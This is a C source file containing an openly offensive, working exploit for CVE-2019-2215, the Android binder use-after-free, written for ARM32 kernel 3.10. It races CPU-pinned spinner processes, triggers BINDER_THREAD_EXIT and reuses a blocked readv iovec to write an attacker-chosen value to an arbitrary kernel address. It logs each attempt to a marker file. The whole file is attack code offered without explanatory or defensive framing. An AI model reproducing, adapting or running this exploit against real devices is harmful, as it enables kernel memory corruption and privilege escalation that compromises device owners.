/* CVE-2019-2215 ARM32 3.10 - v8
 * Saturate CPUs 1..3 with spinner children; main thread pinned to CPU 0.
 * Send a sync transaction to the context manager: its reply (which pops our
 * transaction_stack via binder_pop_transaction) needs a runnable CPU that is
 * not available for up to a scheduler tick, while our send->read->epoll_ctl
 * sequence runs in a few microseconds. So binder_poll registers &thread->wait.
 * Then BINDER_THREAD_EXIT + blocked readv iovec reuse + child EPOLL_CTL_DEL.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <stdint.h>

#define BINDER_WRITE_READ 0xc0186201
#define BINDER_SET_MAX_THREADS 0x40046205
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40286300

#define PAGE 0x1000
#define UAF_SPINLOCK 0x10001
#define IOVEC_CNT 32
#define IDX_LOCK 5
#define IDX_WQ 6
#define CHUNK_BYTES 0x18
#define SPINNERS 3

struct bwr { uint32_t ws, wc, wb, rs, rc, rb; };
struct txdata { uint32_t target, cookie, code, flags; int32_t spid; uint32_t seuid, dsize, osize, buffer, offsets; };

static int bfd = -1, epfd = -1;
static unsigned char dummy[UAF_SPINLOCK];
static unsigned char txn[256] __attribute__((aligned(8)));
static pid_t spinners[SPINNERS];
static int g_rc;
static long g_lastn = -99;
static int g_lasterr;
static unsigned int g_target;
static int g_magic;
static const unsigned int g_val = 0x11223344u;

static void mark(const char *s)
{
    int f = open("/sdcard/r1mark.txt", O_WRONLY|O_CREAT|O_APPEND, 0644);
    if (f >= 0) { write(f, s, strlen(s)); write(f, "\n", 1); fsync(f); close(f); }
}

static void pin_cpu(int cpu)
{
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

static void start_spinners(void)
{
    int i;
    for (i = 0; i < SPINNERS; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            pin_cpu(1 + i);
            for (;;) { volatile unsigned long x = 0; while (x < 50000000UL) x++; }
            _exit(0);
        }
        spinners[i] = pid;
    }
    usleep(50000);
}

static int sm_send(uint32_t handle, uint32_t code, uint32_t flags)
{
    struct txdata td;
    struct bwr b;
    unsigned char wb[4 + sizeof(td)];
    memset(&td, 0, sizeof(td));
    td.target = handle;
    td.code = code;
    td.flags = flags;
    td.dsize = 8;
    td.buffer = (uint32_t)(unsigned long)txn;
    memset(txn, 0, 8);
    *(uint32_t *)wb = BC_TRANSACTION;
    memcpy(wb + 4, &td, sizeof(td));
    memset(&b, 0, sizeof(b));
    b.ws = sizeof(wb);
    b.wb = (uint32_t)(unsigned long)wb;
    return ioctl(bfd, BINDER_WRITE_READ, &b);
}

static int do_read(uint32_t rsize, unsigned char *rb)
{
    struct bwr b;
    memset(&b, 0, sizeof(b));
    b.rs = rsize;
    b.rb = (uint32_t)(unsigned long)rb;
    ioctl(bfd, BINDER_WRITE_READ, &b);
    return (int)b.rc;
}

static int clobber(unsigned int target, const void *src, unsigned int len)
{
    unsigned int testDatum = 0;
    const unsigned int testValue = 0xABCD1234u;

    unsigned int chunk[6];
    /* NOTE: the in-place write lands at iovec[6] whose (base,len) fields are
     * exactly chunk[0],chunk[1]; the payload copy then uses that iovec. */
    chunk[0] = target;                          /* iovec[6].base -> payload dest */
    chunk[1] = len;                             /* iovec[6].len */
    chunk[2] = (unsigned int)(unsigned long)&testDatum; /* iovec[7].base */
    chunk[3] = 4;                               /* iovec[7].len */
    chunk[4] = (unsigned int)(unsigned long)dummy;
    chunk[5] = 0x10;

    unsigned int delta = (UAF_SPINLOCK + CHUNK_BYTES) % PAGE;
    unsigned int padding = delta ? PAGE - delta : 0;

    struct iovec iov[IOVEC_CNT];
    memset(iov, 0, sizeof(iov));
    iov[IDX_LOCK - 1].iov_base = dummy;
    iov[IDX_LOCK - 1].iov_len = padding;
    iov[IDX_LOCK].iov_base = dummy;
    iov[IDX_LOCK].iov_len = 0;
    iov[IDX_WQ].iov_base = chunk;
    iov[IDX_WQ].iov_len = CHUNK_BYTES;
    iov[IDX_WQ + 1].iov_base = dummy;
    iov[IDX_WQ + 1].iov_len = UAF_SPINLOCK;
    iov[IDX_WQ + 2].iov_base = dummy;
    iov[IDX_WQ + 2].iov_len = len;
    iov[IDX_WQ + 3].iov_base = dummy;
    iov[IDX_WQ + 3].iov_len = 4;

    unsigned int total = 0;
    int i;
    for (i = 0; i < IOVEC_CNT; i++) total += iov[i].iov_len;

    struct epoll_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev)) { mark("EPOLL_ADD_FAIL"); return 0; }
    { char dg[48]; snprintf(dg, sizeof(dg), "DRC %d", g_rc); mark(dg); }

    int pp[2];
    if (pipe(pp)) { mark("PIPE_FAIL"); return 0; }
    fcntl(pp[0], F_SETPIPE_SZ, PAGE);
    fcntl(pp[1], F_SETPIPE_SZ, PAGE);

    pid_t pid = fork();
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(200000);
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        unsigned char *f = calloc(1, total);
        if (!f) _exit(2);
        unsigned int pos = padding + UAF_SPINLOCK;
        ssize_t wr;
        memcpy(f + pos, chunk, CHUNK_BYTES); pos += CHUNK_BYTES;
        memcpy(f + pos, src, len); pos += len;
        memcpy(f + pos, &testValue, 4); pos += 4;
        wr = write(pp[1], f, total);
        _exit(wr < 0 ? 3 : 0);
    }

    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    alarm(6);
    ssize_t n = readv(pp[0], iov, IOVEC_CNT);
    g_lastn = (long)n; g_lasterr = errno;
    alarm(0);
    int st = 0;
    waitpid(pid, &st, 0);
    close(pp[0]); close(pp[1]);
    fprintf(stderr, "[*] readv=%ld total=%u test=%08x want=%08x target=%08x\n",
            (long)n, total, testDatum, testValue, g_target);
    return testDatum == testValue;
}

int main(int argc, char **argv)
{
    unsigned int target = 0xc0f7fb0cu;
    unsigned int value = 0;
    int attempt;

    if (argc >= 2) sscanf(argv[1], "%x", &target);
    if (argc >= 3) sscanf(argv[2], "%x", &value);
    if (argc >= 4) g_magic = atoi(argv[3]);
    if (g_magic) {
        void *mp = mmap((void *)0xAA000000UL, 0x1000, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
        mark(mp == (void *)0xAA000000UL ? "MMAP_MAGIC_OK" : "MMAP_MAGIC_FAIL");
    }

    mark("START");
    start_spinners();
    mark("SPINNERS_UP");
    pin_cpu(0);

    for (attempt = 0; attempt < 8; attempt++) {
        char mb[64];
        int rc;
        bfd = open("/dev/binder", O_RDWR | O_NONBLOCK);
        if (bfd < 0) { mark("OPEN_FAIL"); break; }
        if (mmap(NULL, 1 << 20, PROT_READ, MAP_PRIVATE, bfd, 0) == MAP_FAILED) {
            mark("MMAP_FAIL"); break;
        }
        epfd = epoll_create(1000);
        if (epfd < 0) { mark("EPOLL_FAIL"); break; }
        { int mt = 8; ioctl(bfd, BINDER_SET_MAX_THREADS, &mt); }

        sm_send(0, 0, 0);                        /* sync tx to context manager */
        rc = do_read(4096, (unsigned char *)dummy);   /* NOOP + COMPLETE */
        g_rc = rc;
        {
            unsigned int v = value;
            unsigned int addr = target;
            int ok = clobber(addr, &v, 4);
            {
                char cb[64];
                snprintf(cb, sizeof(cb), "CLOBBER ret=%d addr=%08x val=%08x", ok, addr, v);
                mark(cb);
            }
            if (ok) {
                mark("CLOBBER_OK");
                fprintf(stderr, "[+] clobber OK: *%08x = %08x\n", addr, v);
                return 0;
            }
        }
        snprintf(mb, sizeof(mb), "ATTEMPT %d FAIL target=%08x rv=%ld err=%d M=%08x,%08x,%08x",
                 attempt, g_target, g_lastn, g_lasterr,
                 g_magic ? *(volatile unsigned int *)0xAA000000UL : 0,
                 g_magic ? *(volatile unsigned int *)0xAA000004UL : 0,
                 g_magic ? *(volatile unsigned int *)0xAA000008UL : 0);
        mark(mb);
        fprintf(stderr, "[-] attempt %d failed\n", attempt + 1);
    }
    return 2;
}
